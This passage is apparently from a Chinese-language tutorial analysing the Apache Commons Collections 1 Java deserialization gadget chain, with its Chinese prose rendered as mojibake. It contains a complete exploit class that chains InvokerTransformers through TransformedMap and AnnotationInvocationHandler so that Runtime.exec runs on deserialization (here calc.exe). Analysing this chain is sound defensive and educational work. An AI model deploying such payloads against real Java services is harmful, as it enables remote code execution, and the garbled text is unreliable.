</span></span></span><span class=line><span class=cl><span class=k>return</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;getMethod&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>input</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=s>&#34;getRuntime&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;getMethod&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=w> </span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=s>&#34;getRuntime&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=w> </span><span class=p>}),</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h6 id=step4>step4</h6><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>new</span><span class=w> </span><span class=n>ConstantTransformer</span><span class=p>(</span><span class=n>Runtime</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>è‡³æ­¤PoCä¸­çš„transformersæ„é€ å®Œæˆ</p><h4 id=expæ„é€ åˆ†æ>Expæ„é€ åˆ†æ</h4><p>Expéœ€è¦å¯¹PoCè¿›è¡Œæ”¹å†™ï¼Œä½¿åªè¦æœåŠ¡ç«¯æ‰§è¡Œäº†readObjectå‡½æ•°å°±ç­‰äºå‘½ä»¤æ‰§è¡Œï¼Œè¿™æ ·æ›´å®¹æ˜“è§¦å‘æ¼æ´ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example.cc</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ChainedTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ConstantTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.InvokerTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.map.TransformedMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileInputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectInputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Constructor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Map</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>CommonsCollections1</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=n>transformers</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>ConstantTransformer</span><span class=p>(</span><span class=n>Runtime</span><span class=p>.</span><span class=na>class</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;getMethod&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=w> </span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=s>&#34;getRuntime&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=w> </span><span class=p>}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;invoke&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=w> </span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=w> </span><span class=p>}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;exec&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=w> </span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=s>&#34;calc.exe&#34;</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=w> </span><span class=n>transformerChain</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>(</span><span class=n>transformers</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//åˆ›å»ºMapå¹¶ç»‘å®štransformerChina</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=o>&lt;</span><span class=n>Object</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>innerMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>innerMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;value&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;hack&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//ç»™äºˆmapæ•°æ®è½¬åŒ–é“¾</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>outerMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TransformedMap</span><span class=p>.</span><span class=na>decorate</span><span class=p>(</span><span class=n>innerMap</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>transformerChain</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=cm>/*Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
</span></span></span><span class=line><span class=cl><span class=cm>        onlyElement.setValue(&#34;foobar&#34;);*/</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=w> </span><span class=n>c</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=w> </span><span class=n>ctor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>c</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>Class</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Map</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ctor</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ctor</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>SuppressWarnings</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>outerMap</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//payloadåºåˆ—åŒ–å†™å…¥æ–‡ä»¶ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>FileOutputStream</span><span class=w> </span><span class=n>fos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=s>&#34;payload.bin&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>oos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=n>fos</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>oos</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>o</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//æœåŠ¡ç«¯è¯»å–æ–‡ä»¶ï¼Œååºåˆ—åŒ–ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>FileInputStream</span><span class=w> </span><span class=n>fis</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileInputStream</span><span class=p>(</span><span class=s>&#34;payload.bin&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>ois</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=n>fis</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ois</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å’ŒPoCç›¸æ¯”ï¼ŒExpä¸»è¦å¢åŠ äº†ä¸€ä¸ªAnnotationInvocationHandlerç±»çš„ä½¿ç”¨ï¼Œä¸‹é¢ä¸»è¦åˆ†æä¸€ä¸‹AnnotationInvocationHandlerç›¸å…³ä»£ç ã€‚</p><h5 id=annotationinvocationhandler>AnnotationInvocationHandler</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>Annotation</span><span class=o>&gt;</span><span class=w> </span><span class=n>type</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>memberValues</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>AnnotationInvocationHandler</span><span class=p>(</span><span class=n>Class</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>Annotation</span><span class=o>&gt;</span><span class=w> </span><span class=n>var1</span><span class=p>,</span><span class=w> </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>var2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>type</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>var1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>memberValues</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>var2</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>readObject</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>var1</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>var1</span><span class=p>.</span><span class=na>defaultReadObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>AnnotationType</span><span class=w> </span><span class=n>var2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>var2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>AnnotationType</span><span class=p>.</span><span class=na>getInstance</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>type</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IllegalArgumentException</span><span class=w> </span><span class=n>var9</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>InvalidObjectException</span><span class=p>(</span><span class=s>&#34;Non-annotation type in annotation serial stream&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>var3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>var2</span><span class=p>.</span><span class=na>memberTypes</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Iterator</span><span class=w> </span><span class=n>var4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>memberValues</span><span class=p>.</span><span class=na>entrySet</span><span class=p>().</span><span class=na>iterator</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=p>(</span><span class=n>var4</span><span class=p>.</span><span class=na>hasNext</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Map</span><span class=p>.</span><span class=na>Entry</span><span class=w> </span><span class=n>var5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Map</span><span class=p>.</span><span class=na>Entry</span><span class=p>)</span><span class=n>var4</span><span class=p>.</span><span class=na>next</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>var6</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>String</span><span class=p>)</span><span class=n>var5</span><span class=p>.</span><span class=na>getKey</span><span class=p>();</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Class</span><span class=w> </span><span class=n>var7</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Class</span><span class=p>)</span><span class=n>var3</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>var6</span><span class=p>);</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>var7</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Object</span><span class=w> </span><span class=n>var8</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>var5</span><span class=p>.</span><span class=na>getValue</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>var7</span><span class=p>.</span><span class=na>isInstance</span><span class=p>(</span><span class=n>var8</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=p>(</span><span class=n>var8</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>ExceptionProxy</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>var5</span><span class=p>.</span><span class=na>setValue</span><span class=p>((</span><span class=k>new</span><span class=w> </span><span class=n>AnnotationTypeMismatchExceptionProxy</span><span class=p>(</span><span class=n>var8</span><span class=p>.</span><span class=na>getClass</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;[&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>var8</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;]&#34;</span><span class=p>)).</span><span class=na>setMember</span><span class=p>((</span><span class=n>Method</span><span class=p>)</span><span class=n>var2</span><span class=p>.</span><span class=na>members</span><span class=p>().</span><span class=na>get</span><span class=p>(</span><span class=n>var6</span><span class=p>)));</span><span class=c1>//3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>åœ¨æºç å¤„ä¸‹æ–­ï¼Œè°ƒè¯•ç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°æ­¤å¤„å„ä¸ªå˜é‡çš„å€¼ï¼š</p><p>â€‹<img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/image-20240915172449-wefqila.png loading=lazy alt=image>â€‹</p><p>å¯ä»¥çœ‹åˆ°åœ¨3å¤„ï¼Œè§¦å‘äº†AbstractMapEntryDecoratorçš„è°ƒç”¨ï¼Œè¿™å°±ä¸PoCè°ƒç”¨åˆ†æä¸­çš„AbstractInputCheckedMapDecoratorå¯¹åº”ä¸Šäº†ã€‚</p><p>åœ¨æ„é€ Expæ—¶éœ€è¦ç‰¹åˆ«æ³¨æ„1ã€2å¤„çš„ä»£ç ã€‚</p><p>1å¤„ä»£ç å’ŒExpä¸­çš„<code>innerMap.put("value", "hack");</code>â€‹æœ‰å…³ï¼›2å¤„çš„ä»£ç å’ŒExpä¸­çš„<code>Object o = ctor.newInstance(SuppressWarnings.class, outerMap);</code>â€‹æœ‰å…³ã€‚</p><p>SuppressWarningsç±»çš„ä»£ç å¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=nd>@Target</span><span class=p>({</span><span class=n>ElementType</span><span class=p>.</span><span class=na>TYPE</span><span class=p>,</span><span class=w> </span><span class=n>ElementType</span><span class=p>.</span><span class=na>FIELD</span><span class=p>,</span><span class=w> </span><span class=n>ElementType</span><span class=p>.</span><span class=na>METHOD</span><span class=p>,</span><span class=w> </span><span class=n>ElementType</span><span class=p>.</span><span class=na>PARAMETER</span><span class=p>,</span><span class=w> </span><span class=n>ElementType</span><span class=p>.</span><span class=na>CONSTRUCTOR</span><span class=p>,</span><span class=w> </span><span class=n>ElementType</span><span class=p>.</span><span class=na>LOCAL_VARIABLE</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=nd>@Retention</span><span class=p>(</span><span class=n>RetentionPolicy</span><span class=p>.</span><span class=na>SOURCE</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=nd>@interface</span><span class=w> </span><span class=n>SuppressWarnings</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=nf>value</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å¯è§è‹¥innerMap.putçš„keyå€¼ä¸æ˜¯<strong>value</strong>ï¼Œæˆ–è€…SuppressWarningsç±»ä¸­æ²¡æœ‰<strong>value</strong>æ–¹æ³•ï¼Œ1ã€2å¤„ä»£ç å°±æ— æ³•é¡ºåˆ©æ‰§è¡Œã€‚</p><p>é™¤äº†SuppressWarningsç±»ï¼Œè¿˜æœ‰Targetç±»å’ŒRetentionç±»ï¼Œå®ƒä»¬çš„ä»£ç åˆ†åˆ«å¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=nd>@Documented</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=nd>@Retention</span><span class=p>(</span><span class=n>RetentionPolicy</span><span class=p>.</span><span class=na>RUNTIME</span><span class=p>)</span><span class=w>
